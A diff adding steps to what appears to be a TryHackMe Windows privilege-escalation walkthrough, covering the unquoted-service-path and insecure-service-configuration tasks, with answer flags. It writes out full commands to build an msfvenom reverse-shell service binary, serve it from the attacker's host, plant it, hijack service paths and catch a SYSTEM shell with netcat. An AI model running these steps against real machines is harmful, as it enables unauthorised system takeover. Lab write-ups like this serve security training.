@@ -185,17 +185,94 @@ This guide contains the answer and steps necessary to get to them for the [Windo
 
    ><details><summary>Click for answer</summary>THM{AT_YOUR_SERVICE}</details>
 
-3. Get the flag on svcusr2's desktop.
+2. Get the flag on svcusr2's desktop.
 
+   We will first check the the permissions for the installation path for the "disk sorter enterprise" service.
 
+   ```cmd
+   sc qc "disk sorter enterprise"
 
-   ><details><summary>Click for answer</summary></details>
+   icacls C:\MyPrograms
+   ```
+
+   SERVICES QUOTES SERVICE
+   
+   Now we can create another reverse shell to use. Then we transfer it over to the target system and move in to the correct folder. Lastly, we must give everyone permission to use the file.
+
+   ```cmd
+   msfvenom -p windows/x64/shell_reverse_tcp lhost=10.18.78.136 lport=1337 -f exe-service -o rev-svc2.exe
+
+   python3 -m http.server 8080
+
+   wget 10.18.78.136:8080/rev-svc2.exe -o rev-svc2.exe
+
+   move C:\Users\thm-unpriv\rev-svc2.exe Disk.exe
+
+   icacls C:\MyPrograms\Disk.exe /grant Everyone:F
+   ```
+   
+   Then we set up our listener and stop/start the service to receive a connection.
+
+   ```cmd
+   nc -nlvp 1337
+
+   sc stop "disk sorter enterprise"
+
+   sc start "disk sorter enterprise"
+   ```
+   
+   SERVICES QUOTES CONNECTION
+
+   Now, we only have to look for and read the flag.
+
+   SERVICES QUOTES FLAG
+   
+   ><details><summary>Click for answer</summary>THM{QUOTES_EVERYWHERE}</details>
 
 4. Get the flag on the Administrator's desktop.
 
+   First we check the permission for the service DACL configuration using Sysinternals suite.
 
+   ```cmd
+   C:\tools\AccessChk>accesschk64.exe -qlc thmservice
+   ```
 
-   ><details><summary>Click for answer</summary></details>
+   SERVICES CONFIG PERMISSIONS
+   
+   Looks like we (BUILTIN\Users) have permission (SERVICE_ALL_ACCESS) to change the configuration.
+   
+   ```cmd
+   sc config THMService binPath= "C:\Users\thm-unpriv\rev-svc3.exe" obj= LocalSystem
+   ```
+   
+   Now we can create another reverse shell to use. Then we transfer it over to the target system and move in to the correct folder. Lastly, we must give everyone permission to use the file.
+
+   ```cmd
+   msfvenom -p windows/x64/shell_reverse_tcp lhost=10.18.78.136 lport=1337 -f exe-service -o rev-svc3.exe
+
+   python3 -m http.server 8080
+
+   wget 10.18.78.136:8080/rev-svc2.exe -o rev-svc3.exe
+
+   icacls C:\Users\thm-unpriv\rev-svc3.exe /grant Everyone:F
+   ```
+
+   Then we set up our listener and stop/start the service to receive a connection.
+   
+   ```cmd
+   nc -nlvp 1337
+
+   sc stop "thmservice"
+
+   sc start "thmservice"
+   ```
+   
+   SERVICES CONFIG CONNECTION
+   
+   Now, we only have to look for and read the flag.
+   
+   SERVICES CONFIG FLAG
+   ><details><summary>Click for answer</summary>THM{INSECURE_SVC_CONFIG}</details>
 
 ### Abusing dangerous privileges
 
